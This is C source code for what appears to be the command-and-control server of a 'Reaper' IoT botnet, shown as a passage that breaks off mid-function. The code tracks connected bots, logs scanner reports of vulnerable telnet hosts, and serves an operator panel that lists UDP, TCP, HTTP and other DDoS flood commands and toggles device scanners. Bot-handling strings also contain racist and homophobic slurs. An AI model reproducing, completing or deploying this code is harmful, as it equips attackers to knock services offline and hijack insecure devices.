/*
Login file = reaper.txt
Added CNC method and HTTP Method
Pictures >
http://prntscr.com/k3btcj
http://prntscr.com/k3btt7
http://prntscr.com/k3bu5p
http://prntscr.com/k3bua6
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

#define MAXFDS 1000000

struct account {
    char id[20]; 
    char password[20];
};
static struct account accounts[50]; //max users is set on 50
struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
        int connected;
} managements[MAXFDS];
////////////////////////////////////
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
////////////////////////////////////
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}
static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "STOP USING RELIVANT PORTS\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[0;31m", 5, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                //printf("sent to fd: %d\n", i);
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[0;31m\x1b[0;31m~~\x1b[1;37m> \x1b[0;31m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
                                           //WE ARE MAKING SURE THERE IS NO DUP CLIENTS
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {                  //WE ARE MAKE SURE AGAIN HERE BY SENDING !* LOLNOGTFO|!* GTFOFAG
                                                if(send(infd, "!* GTFONIGGER\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                if(send(infd, "!* GTFOFAG\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                if(send(infd, "!* GTFODUP\n\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                if(send(infd, "!* DUPES\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                if(send(infd, "!* GTFOPUSSY\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                if(send(infd, "!* LOLNOGTFO\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                close(infd);
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
                                        send(infd, "!* PHONE ON\n", 11, MSG_NOSIGNAL);
                                        
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) // basic IRC-like ping/pong challenge/response to see if server is alive
                                                {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                        continue;
                                                }
                                                if(strstr(buf, "REPORT ") == buf) // received a report of a vulnerable system from a scan
                                                {
                                                        char *line = strstr(buf, "REPORT ") + 7; 
                                                        fprintf(telFD, "%s\n", line); // let's write it out to disk without checking what it is!
                                                        fflush(telFD);
                                                        TELFound++;
                                                        continue;
                                                }
                                                if(strstr(buf, "PROBING") == buf)
                                                {
                                                        char *line = strstr(buf, "PROBING");
                                                        scannerreport = 1;
                                                        continue;
                                                }
                                                if(strstr(buf, "REMOVING PROBE") == buf)
                                                {
                                                        char *line = strstr(buf, "REMOVING PROBE");
                                                        scannerreport = 0;
                                                        continue;
                                                }
                                                if(strcmp(buf, "PONG") == 0)
                                                {
                                                        continue;
                                                }
 
                                                printf("buf: \"%s\"\n", buf);
                                        }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0; Bots: %d [+]@Flexingonlamers[+] Users: %d %c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 
                sleep(3);
        }
}
int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("reaper.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 
void *telnetWorker(void *sock)
{
        char usernamez[5000];
        int thefd = (int)sock;
        int find_line;
        managesConnected++;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char* username;
        char* password;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);
    
        FILE *fp;
        int i=0;
        int c;
        fp=fopen("reaper.txt", "r"); 
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
        {
            fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
            ++j;
        }
        
        if(send(thefd, "\x1b[0;31mUsername:\x1b[0;36m\x1b[30m", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);
        if(strcmp(nickstring, accounts[find_line].id) == 0){    
        if(send(thefd, "\x1b[0;36m*    Valid Login        *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;    
        if(send(thefd, "\x1b[0;31mPassword:\x1b[0;36m", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[0;36***********************************\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[0;36*            Denied               *\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[0;36***********************************\r\n", 43, MSG_NOSIGNAL) == -1) goto end;
            sleep(5);
        goto end;
        fak:

        Title:
        pthread_create(&title, NULL, &titleWriter, sock);
        char ascii_banner_line1 [90000];
        char ascii_banner_line2 [90000];
        char ascii_banner_line3 [90000];
        char ascii_banner_line4 [90000];
        char ascii_banner_line5 [90000];
        char ascii_banner_line6 [90000];
        char ascii_banner_line7 [90000];
        char ascii_banner_line8 [90000];
        char ascii_banner_line9 [90000];
        char ascii_banner_line10 [90000];
        char ascii_banner_line11 [90000];
        char ascii_banner_line12 [90000];
        char ascii_banner_line13 [90000];
        char ascii_banner_line14 [90000];
        char ascii_banner_line15 [90000];
        char ascii_banner_line16 [90000];
        char ascii_banner_line17 [90000];
        char ascii_banner_line18 [90000];
        char ascii_banner_line19 [90000];
        char ascii_banner_line20 [90000];
        char ascii_banner_line21 [90000];
        char ascii_banner_line22 [90000];
        char ascii_banner_line23 [90000];
        char line1 [5000];
        char line2 [5000];

        sprintf(ascii_banner_line1, "\x1b[0;31m8888888b\r\n"); 
        sprintf(ascii_banner_line2, "\x1b[0;31m888   Y88b\r\n"); 
        sprintf(ascii_banner_line3, "\x1b[0;31m888    888\r\n"); 
        sprintf(ascii_banner_line4, "\x1b[0;31m888   d88P .d88b.   8888b.  88888b.   .d88b.  888d888\r\n"); 
        sprintf(ascii_banner_line5, "\x1b[0;31m8888888P  d8P  Y8b      88b 888  88b d8P  Y8b 888P\r\n"); 
        sprintf(ascii_banner_line6, "\x1b[0;31m888 T88b  88888888 .d888888 888  888 88888888 888\r\n"); 
        sprintf(ascii_banner_line7, "\x1b[0;31m888  T88b Y8b.     888  888 888 d88P Y8b.     888\r\n"); 
        sprintf(ascii_banner_line8, "\x1b[0;31m888   T88b  Y8888   Y888888 88888P     Y8888  888\r\n"); 
        sprintf(ascii_banner_line9, "\x1b[0;31m                            888\r\n"); 
        sprintf(ascii_banner_line10, "\x1b[0;31m                            888\r\n"); 
        sprintf(ascii_banner_line11, "\x1b[0;31m                            888  \r\n"); 
        sprintf(ascii_banner_line12, "\x1b[0;31m\r\n"); 
        sprintf(ascii_banner_line13, "\x1b[0;31m*********************************************\r\n"); 
        sprintf(ascii_banner_line14, "\x1b[0;31m*           \x1b[1;37mWelcome To The Reaper           \x1b[0;31m*\r\n", accounts[find_line].id, buf);
        sprintf(ascii_banner_line15, "\x1b[0;31m********************************************* \r\n");
        sprintf(ascii_banner_line16, "\x1b[0;31m\r\n"); 
        sprintf(ascii_banner_line17,  "\x1b[0;31mSelect An Option:\r\n");
        sprintf(ascii_banner_line18,  "\x1b[0;37m[\x1b[1;32mHELP\x1b[0;37m] -\x1b[1;37mShows Attack Commands\r\n");
        sprintf(ascii_banner_line19,  "\x1b[0;37m[\x1b[1;33mRULES\x1b[0;37m] -\x1b[1;37mShow T.O.S Of ReaperNet\r\n");
        sprintf(ascii_banner_line20,  "\x1b[0;37m[\x1b[0;34mPORTS\x1b[0;37m] -\x1b[1;37mShows Usable Ports\r\n");;
        sprintf(ascii_banner_line21,  "\x1b[0;37m[\x1b[0;35mSTRESS\x1b[0;37m] -\x1b[1;37mShows Boot Tutorial\r\n");;
        sprintf(ascii_banner_line22,  "\x1b[0;37m[\x1b[1;36mEXTRA\x1b[0;37m] -\x1b[1;37mShows Something For Skidz\r\n");;
        sprintf(ascii_banner_line23,  "\x1b[1;37mLogged In As:\x1b[0;31m %s\x1b[0;37m\r\n", accounts[find_line].id, buf);
        
        if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line7 , strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line8 , strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line9 , strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line10 , strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line11 , strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line12 , strlen(ascii_banner_line12), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line13 , strlen(ascii_banner_line13), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line14 , strlen(ascii_banner_line14), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line15 , strlen(ascii_banner_line15), MSG_NOSIGNAL) == -1) goto end;    
        if(send(thefd, ascii_banner_line16 , strlen(ascii_banner_line16), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line17 , strlen(ascii_banner_line17), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line18 , strlen(ascii_banner_line18), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line19 , strlen(ascii_banner_line19), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line20 , strlen(ascii_banner_line20), MSG_NOSIGNAL) == -1) goto end;    
        if(send(thefd, ascii_banner_line21 , strlen(ascii_banner_line21), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line22 , strlen(ascii_banner_line22), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line23 , strlen(ascii_banner_line23), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line2, strlen(line2), MSG_NOSIGNAL) == -1) goto end;
        while(1) {
        if(send(thefd, "\x1b[1;37m[root@Reaper ~]#", 24, MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
        
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
        
        if(strstr(buf, "!* PHONE ON")) 
        {
          sprintf(botnet, "PHONE SCANNER STARTED\r\n", TELFound, scannerreport);
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        
        if(strstr(buf, "!* PHONE OFF")) 
        {
          sprintf(botnet, "PHONE SCANNER STOPPED\r\n", TELFound, scannerreport);
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  

        if(strstr(buf, "BOTS"))
        {  
        sprintf(botnet, "[+] Bots: %d [-] Users: %d [+]\r\n", clientsConnected(), managesConnected);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        
        if(strstr(buf, "ABOUT"))
        {  
        sprintf(botnet, "Reaper Serverside. ReCreated By FlexingOnLamers\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }    

        if(strstr(buf, "bots"))
        {  
        sprintf(botnet, "[+] Bots: %d [-] Users: %d [+]\r\n", clientsConnected(), managesConnected);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
        if(strstr(buf, "!* SCANNER OFF"))
        {  
        sprintf(botnet, "TELNET SCANNER STOPPED\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* TCP"))
        {  
        sprintf(botnet, "Succesfully Sent A TCP FLOOD\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* UDP"))
        {  
        sprintf(botnet, "Succesfully Sent A UDP FLOOD\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* STD"))
        {  
        sprintf(botnet, "STD Flood Sent to Skid\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* CNC"))
        {  
        sprintf(botnet, "CNC Flooding Users Botnet!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* HTTP"))
        {  
        sprintf(botnet, "Succesfully Sent A HTTP Reaper Flood!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* SCANNER ON"))
        {  
        sprintf(botnet, "TELNET SCANNER STARTED\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
                if(strstr(buf, "!* SCANNER OFF"))
        {  
        sprintf(botnet, "TELNET SCANNER STOPPED\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
}
            if(strstr(buf, "HELP")) {
                pthread_create(&title, NULL, &titleWriter, sock);
                char helpline1  [5000];
                char helpline2  [5000];
                char helpline3  [5000];
                char helpline4  [5000];
                char helpline5  [5000];
                char helpline6  [5000];
                char helpline7  [5000];
                char helpline8  [5000];
                char helpline9  [5000];
                char helpline10  [5000];
                char helpline11  [5000];
                char helpline12  [5000];
                char helpline13  [5000];
                char helpline14  [5000];
                char helpline15  [5000];

                sprintf(helpline1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]Attack Commands\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
                sprintf(helpline2,  "---------------------------------------------------------\r\n");
                sprintf(helpline3,  "\x1b[1;37m[\x1b[1;32mUDP Flood\x1b[1;37m]    !* UDP IP PORT TIME 32 0 1\r\n");
                sprintf(helpline4,  "\x1b[1;37m[\x1b[1;33mTCP Flood\x1b[1;37m]    !* TCP IP PORT TIME 32 all 0 1\r\n");
                sprintf(helpline5,  "\x1b[1;37m[\x1b[0;34mSTD Flood\x1b[1;37m]    !* STD IP PORT TIME\r\n");
                sprintf(helpline6,  "\x1b[1;37m[\x1b[0;35mHOLD Flood\x1b[1;37m]   !* HOLD IP PORT TIME\r\n");
                sprintf(helpline7,  "\x1b[1;37m[\x1b[1;36mJUNK Flood\x1b[1;37m]   !* JUNK IP PORT TIME\r\n");
                sprintf(helpline8,  "\x1b[1;37m[\x1b[0;31mHTTP Flood\x1b[1;37m]   !* HTTP URL TIME\r\n");
                sprintf(helpline9,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]Other Commands\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]\r\n");
                sprintf(helpline10,  "---------------------------------------------------------\r\n");
                sprintf(helpline11,  "\x1b[1;37m[\x1b[1;32mClear Screen\x1b[1;37m]    CLEAR\r\n");
                sprintf(helpline12,  "\x1b[1;37m[\x1b[1;33mLOGOUT\x1b[1;37m]          LOGOUT\r\n");
                sprintf(helpline13,  "\x1b[1;37m[\x1b[0;34mUsable Ports\x1b[1;37m]    PORTS\r\n");
                sprintf(helpline14,  "\x1b[1;37m[\x1b[0;35mRules\x1b[1;37m]           RULES\r\n");
                sprintf(helpline15,  "\x1b[1;37m[\x1b[1;36mStop Attack\x1b[1;37m]     KILLATTK\r\n");

                if(send(thefd, helpline1,  strlen(helpline1),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline2,  strlen(helpline2),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline3,  strlen(helpline3),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline4,  strlen(helpline4),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline5,  strlen(helpline5),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline6,  strlen(helpline6),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline7,  strlen(helpline7),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline8,  strlen(helpline8),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline9,  strlen(helpline9),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline10,  strlen(helpline10),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline11,  strlen(helpline11),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline12,  strlen(helpline12),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline13,  strlen(helpline13),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline14,  strlen(helpline14),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline15,  strlen(helpline15),   MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &titleWriter, sock);
                while(1) {
                if(send(thefd, "\x1b[1;37m[root@Reaper ~]#", 24, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
        }
             if(strstr(buf, "help")) {
                pthread_create(&title, NULL, &titleWriter, sock);
                char helpline1  [5000];
                char helpline2  [5000];
                char helpline3  [5000];
                char helpline4  [5000];
                char helpline5  [5000];
                char helpline6  [5000];
                char helpline7  [5000];
                char helpline8  [5000];
                char helpline9  [5000];
                char helpline10  [5000];
                char helpline11  [5000];
                char helpline12  [5000];
                char helpline13  [5000];
                char helpline14  [5000];
                char helpline15  [5000];

                sprintf(helpline1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]Attack Commands\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
                sprintf(helpline2,  "---------------------------------------------------------\r\n");
                sprintf(helpline3,  "\x1b[1;37m[\x1b[1;32mUDP Flood\x1b[1;37m]    !* UDP IP PORT TIME 32 0 1\r\n");
                sprintf(helpline4,  "\x1b[1;37m[\x1b[1;33mTCP Flood\x1b[1;37m]    !* TCP IP PORT TIME 32 all 0 1\r\n");
                sprintf(helpline5,  "\x1b[1;37m[\x1b[0;34mSTD Flood\x1b[1;37m]    !* STD IP PORT TIME\r\n");
                sprintf(helpline6,  "\x1b[1;37m[\x1b[0;35mHOLD Flood\x1b[1;37m]   !* HOLD IP PORT TIME\r\n");
                sprintf(helpline7,  "\x1b[1;37m[\x1b[1;36mJUNK Flood\x1b[1;37m]   !* JUNK IP PORT TIME\r\n");
                sprintf(helpline8,  "\x1b[1;37m[\x1b[0;31mHTTP Flood\x1b[1;37m]   !* HTTP URL TIME\r\n");
                sprintf(helpline9,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]Other Commands\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]\r\n");
                sprintf(helpline10,  "---------------------------------------------------------\r\n");
                sprintf(helpline11,  "\x1b[1;37m[\x1b[1;32mClear Screen\x1b[1;37m]    CLEAR\r\n");
                sprintf(helpline12,  "\x1b[1;37m[\x1b[1;33mLOGOUT\x1b[1;37m]          LOGOUT\r\n");
                sprintf(helpline13,  "\x1b[1;37m[\x1b[0;34mUsable Ports\x1b[1;37m]    PORTS\r\n");
                sprintf(helpline14,  "\x1b[1;37m[\x1b[0;35mRules\x1b[1;37m]           RULES\r\n");
                sprintf(helpline15,  "\x1b[1;37m[\x1b[1;36mStop Attack\x1b[1;37m]     KILLATTK\r\n");

                if(send(thefd, helpline1,  strlen(helpline1),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline2,  strlen(helpline2),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline3,  strlen(helpline3),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline4,  strlen(helpline4),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline5,  strlen(helpline5),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline6,  strlen(helpline6),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline7,  strlen(helpline7),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline8,  strlen(helpline8),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline9,  strlen(helpline9),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline10,  strlen(helpline10),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline11,  strlen(helpline11),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline12,  strlen(helpline12),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline13,  strlen(helpline13),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline14,  strlen(helpline14),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline15,  strlen(helpline15),   MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &titleWriter, sock);
                while(1) {
                if(send(thefd, "\x1b[1;37m[root@Reaper ~]#", 24, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
        }
                    if(strstr(buf, "STRESS")) {
                pthread_create(&title, NULL, &titleWriter, sock);
                char ddosline1  [5000];
                char ddosline2  [5000];
                char ddosline3  [5000];
                char ddosline4  [5000];
                char ddosline5  [5000];
                char ddosline6  [5000];
                char ddosline7  [5000];
                char ddosline8  [5000];
                char ddosline9  [5000];

                sprintf(ddosline1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]Attack Commands\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
                sprintf(ddosline2,  "---------------------------------------------------------\r\n");
                sprintf(ddosline3,  "\x1b[1;37m[\x1b[1;32mUDP Flood\x1b[1;37m]    !* UDP IP PORT TIME 32 0 1\r\n");
                sprintf(ddosline4,  "\x1b[1;37m[\x1b[1;33mTCP Flood\x1b[1;37m]    !* TCP IP PORT TIME 32 all 0 1\r\n");
                sprintf(ddosline5,  "\x1b[1;37m[\x1b[0;34mSTD Flood\x1b[1;37m]    !* STD IP PORT TIME\r\n");
                sprintf(ddosline6,  "\x1b[1;37m[\x1b[0;35mHOLD Flood\x1b[1;37m]   !* HOLD IP PORT TIME\r\n");
                sprintf(ddosline7,  "\x1b[1;37m[\x1b[1;36mJUNK Flood\x1b[1;37m]   !* JUNK IP PORT TIME\r\n");
                sprintf(ddosline8,  "\x1b[1;37m[\x1b[0;31mHTTP Flood\x1b[1;37m]   !* HTTP URL TIME\r\n");
                sprintf(ddosline9,  "---------------------------------------------------------\r\n");

                if(send(thefd, ddosline1,  strlen(ddosline1),   MSG_NOSIGNAL) == -1) goto end;
